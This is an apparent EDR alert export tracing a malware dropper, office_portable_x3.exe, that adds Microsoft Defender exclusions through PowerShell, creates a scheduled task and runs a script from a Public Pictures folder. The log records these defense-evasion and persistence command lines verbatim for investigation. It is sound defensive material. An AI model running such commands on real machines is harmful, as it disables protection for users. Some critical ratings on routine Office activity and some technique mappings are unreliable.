Timestamp,Process,Parent Process,Command Line,Detection Type,Risk Score,Investigation Reason,Source IP,Destination IP,Registry Path,File Path,DNS Query,Event Action,PID,MITRE Technique,MITRE Name,Allowlisted,Severity,Confidence,FP Assessment,Analyst Verdict,Recommendation,Alert ID
"Jun 1, 2026 @ 14:21:18.247",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,100,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\outlook.exe\mitigationoptions ; Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\cnfnot32.exe\mitigationoptions ; Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\scanost.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\outlook.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-C8A6804A
"Jun 1, 2026 @ 14:24:16.947",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,External Communication | Network Outlier,100,Outbound to external IP: 52.109.0.35 ; Outbound to external IP: 52.108.9.12 ; High distinct destinations for excel.exe,173.10.254.170,52.109.0.35,,,,disconnect_received,"25,556",,,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Block destination IP at perimeter; review netflow,AH-35FBC677
"Jun 1, 2026 @ 14:23:15.549",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionProcess 'C:\Windows\System32\clip.exe'""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Suspicious User-Agent / Tool,100,Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionprocess' ; Tool signature in user-agent/command: powershell,,,,,,start,"11,540",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-58C9CB27
"Jun 1, 2026 @ 14:23:16.607",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionProcess 'C:\Windows\System32\clip.exe'""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Suspicious User-Agent / Tool,100,Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionprocess' ; Tool signature in user-agent/command: powershell,,,,,,end,"11,540",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-9A9685CA
"Jun 1, 2026 @ 14:23:16.629",C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,"C:\Windows\system32\cmd.exe /c ""powershell -Command ""Add-MpPreference -ExclusionProcess 'C:\Windows\System32\clip.exe'""""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Suspicious User-Agent / Tool,100,Living-off-the-land binary: cmd.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionprocess' ; Tool signature in user-agent/command: powershell,,,,,,end,"26,804",T1059.003,Windows Command Shell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-BA9524A6
"Jun 1, 2026 @ 14:24:02.219",C:\Windows\System32\wscript.exe,C:\Windows\System32\svchost.exe,"""C:\Windows\System32\wscript.exe"" C:\Users\Public\Pictures\kelotopu\xuvotopo.js",LOLBin Abuse | Sigma Match | Suspicious Parent-Child | Svchost Script Spawn,100,"Living-off-the-land binary: wscript.exe ; Suspicious spawn: svchost.exe → wscript.exe ; svchost spawned script engine with suspicious path: ""c:\windows\system32\wscript.exe"" c:\users\public\pictures\kelotopu\xuvotopo.js ; svchost.exe launching a script interpreter",,,,,,start,"33,896",T1059.005,Visual Basic,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Review full command line and parent process chain,AH-C6C7A2B2
"Jun 1, 2026 @ 14:23:14.385",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL\AppData\Local\Temp'""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath' ; Tool signature in user-agent/command: powershell,,,,,,end,"33,860",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-E7A7DB6A
"Jun 1, 2026 @ 14:23:14.403",C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,"C:\Windows\system32\cmd.exe /c ""powershell -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL\AppData\Local\Temp'""""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,Living-off-the-land binary: cmd.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath' ; Tool signature in user-agent/command: powershell,,,,,,end,"7,396",T1059.003,Windows Command Shell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-0F8E9D79
"Jun 1, 2026 @ 14:23:14.408",C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,"C:\Windows\system32\cmd.exe /c ""powershell -Command ""Add-MpPreference -ExclusionProcess 'C:\Windows\System32\cmd.exe'""""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Suspicious User-Agent / Tool,100,Living-off-the-land binary: cmd.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionprocess' ; Tool signature in user-agent/command: powershell,,,,,,start,"19,284",T1059.003,Windows Command Shell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-1E9EDB7C
"Jun 1, 2026 @ 14:23:14.466",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionProcess 'C:\Windows\System32\cmd.exe'""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Suspicious User-Agent / Tool,100,Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionprocess' ; Tool signature in user-agent/command: powershell,,,,,,start,"10,492",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-628A1ECC
"Jun 1, 2026 @ 14:23:13.317",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\Public\Pictures\kelotopu'""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath' ; Tool signature in user-agent/command: powershell,,,,,,end,"2,204",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-4791C22C
"Jun 1, 2026 @ 14:23:13.334",C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,"C:\Windows\system32\cmd.exe /c ""powershell -Command ""Add-MpPreference -ExclusionPath 'C:\Users\Public\Pictures\kelotopu'""""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,Living-off-the-land binary: cmd.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath' ; Tool signature in user-agent/command: powershell,,,,,,end,"15,252",T1059.003,Windows Command Shell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-85F7557A
"Jun 1, 2026 @ 14:23:13.336",C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,"C:\Windows\system32\cmd.exe /c ""powershell -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL\AppData\Local\Temp'""""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,Living-off-the-land binary: cmd.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath' ; Tool signature in user-agent/command: powershell,,,,,,start,"7,396",T1059.003,Windows Command Shell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-57518A36
"Jun 1, 2026 @ 14:23:13.405",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL\AppData\Local\Temp'""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath' ; Tool signature in user-agent/command: powershell,,,,,,start,"33,860",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-58D05900
"Jun 1, 2026 @ 14:23:22.978",C:\Windows\System32\schtasks.exe,C:\Users\DELL\office_portable_x3.exe,schtasks /create /tn xuvotopo /xml C:\Users\Public\Pictures\kelotopu\xuvotopo.xml /f,LOLBin Abuse | Persistence via Cmdline | Rare Parent-Child | Sigma Match,100,Rare process pair: office_portable_x3.exe->schtasks.exe ; Living-off-the-land binary: schtasks.exe ; Persistence command: schtasks /create /tn xuvotopo /xml c:\users\public\pictures\kelotopu\xuvotopo.xml /f ; schtasks creating a task,,,,,,start,"1,948",T1053.005,Scheduled Task,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Review full command line and parent process chain,AH-04012947
"Jun 1, 2026 @ 14:23:23.205",C:\Windows\System32\schtasks.exe,C:\Users\DELL\office_portable_x3.exe,schtasks /create /tn xuvotopo /xml C:\Users\Public\Pictures\kelotopu\xuvotopo.xml /f,LOLBin Abuse | Persistence via Cmdline | Rare Parent-Child | Sigma Match,100,Rare process pair: office_portable_x3.exe->schtasks.exe ; Living-off-the-land binary: schtasks.exe ; Persistence command: schtasks /create /tn xuvotopo /xml c:\users\public\pictures\kelotopu\xuvotopo.xml /f ; schtasks creating a task,,,,,,end,"1,948",T1053.005,Scheduled Task,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Review full command line and parent process chain,AH-D1899406
"Jun 1, 2026 @ 14:21:16.773",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,100,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\selfcert.exe\mitigationoptions ; Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\msohtmed.exe\mitigationoptions ; Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\setlang.exe\mitigationoptions ; Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\msqry32.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\selfcert.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-5540BC28
"Jun 1, 2026 @ 14:21:16.774",C:\Program Files\Microsoft Office\root\Integration\Integrator.exe,,,Persistence,100,Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\msoxmled.exe\mitigationoptions ; Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\excelcnv.exe\mitigationoptions ; Persistence registry path: hklm\software\microsoft\windows nt\currentversion\image file execution options\wordconv.exe\mitigationoptions,,,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msoxmled.exe\MitigationOptions,,,modification,"17,008",T1547.001,Registry Run Keys / Startup Folder,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Enumerate autoruns (Autoruns for Windows); remove malicious entry,AH-4D51C3D0
"Jun 1, 2026 @ 14:23:12.144",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL'""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath' ; Tool signature in user-agent/command: powershell,,,,,,end,"6,972",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-65B8243B
"Jun 1, 2026 @ 14:23:12.163",C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,"C:\Windows\system32\cmd.exe /c ""powershell -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL'""""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,Living-off-the-land binary: cmd.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath' ; Tool signature in user-agent/command: powershell,,,,,,end,"27,136",T1059.003,Windows Command Shell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-E10068CA
"Jun 1, 2026 @ 14:23:12.166",C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,"C:\Windows\system32\cmd.exe /c ""powershell -Command ""Add-MpPreference -ExclusionPath 'C:\Users\Public\Pictures\kelotopu'""""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,Living-off-the-land binary: cmd.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath' ; Tool signature in user-agent/command: powershell,,,,,,start,"15,252",T1059.003,Windows Command Shell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-F669406F
"Jun 1, 2026 @ 14:23:12.231",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\Public\Pictures\kelotopu'""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath' ; Tool signature in user-agent/command: powershell,,,,,,start,"2,204",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-3D080498
"Jun 1, 2026 @ 14:23:10.561",C:\Windows\System32\cmd.exe,C:\Users\DELL\office_portable_x3.exe,"C:\Windows\system32\cmd.exe /c ""powershell -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL'""""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,Living-off-the-land binary: cmd.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath' ; Tool signature in user-agent/command: powershell,,,,,,start,"27,136",T1059.003,Windows Command Shell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-BF3B4EF1
"Jun 1, 2026 @ 14:23:10.672",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,C:\Windows\System32\cmd.exe,"powershell  -Command ""Add-MpPreference -ExclusionPath 'C:\Users\DELL'""",Defense Evasion | LOLBin Abuse | PowerShell Payload | Sigma Match | Suspicious User-Agent / Tool,100,Living-off-the-land binary: powershell.exe ; Suspicious PowerShell keyword in command ; Defense evasion keyword: 'add-mppreference -exclusionpath' ; Tool signature in user-agent/command: powershell,,,,,,start,"6,972",T1059.001,PowerShell,False,CRITICAL,HIGH,Highly Suspicious,Escalate Immediately,Re-enable Defender; check ExclusionPath list; reboot,AH-0ADA40AD
"Jun 1, 2026 @ 14:23:01.254",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\ProxyBypass,,,modification,"22,348",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-5581FD2F
"Jun 1, 2026 @ 14:21:44.249",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,100,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\SystemTemp\~DF195CBE8F36B8CF7D.TMP,,deletion,"5,516",T1218,,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Review full command line and parent process chain,AH-CEC5588F
"Jun 1, 2026 @ 14:21:44.253",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,100,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\SystemTemp\~DF32DC07AC6C1C7C0E.TMP,,deletion,"5,516",T1218,,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Review full command line and parent process chain,AH-9AE38043
"Jun 1, 2026 @ 14:23:04.838",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\002.xml,,deletion,"9,916",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-EE9AA75B
"Jun 1, 2026 @ 14:23:04.840",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\002_b.js,,deletion,"9,916",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-69E8DF1E
"Jun 1, 2026 @ 14:23:04.841",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\data_p002\pack.js,,deletion,"9,916",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-E87EB71B
"Jun 1, 2026 @ 14:23:04.853",C:\Users\DELL\office_portable_x3.exe,,,Malware Staging | Sigma Match,100,Execution from user-writable path: c:\users\dell\office_portable_x3.exe ; Executable running from Users/ directory — possible dropper,,,,C:\Users\DELL\AppData\Local\Temp\_MEI99162\select.pyd,,deletion,"9,916",T1036,Masquerading,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Collect file artefacts; hash and submit to VT,AH-DB909745
"Jun 1, 2026 @ 14:21:43.241",C:\Windows\System32\msiexec.exe,,,LOLBin Abuse,100,Living-off-the-land binary: msiexec.exe,,,,C:\Windows\SystemTemp\~DF02FE7A77618DC74C.TMP,,deletion,"5,516",T1218,,False,CRITICAL,MEDIUM,Highly Suspicious,Escalate Immediately,Review full command line and parent process chain,AH-2F6978CC
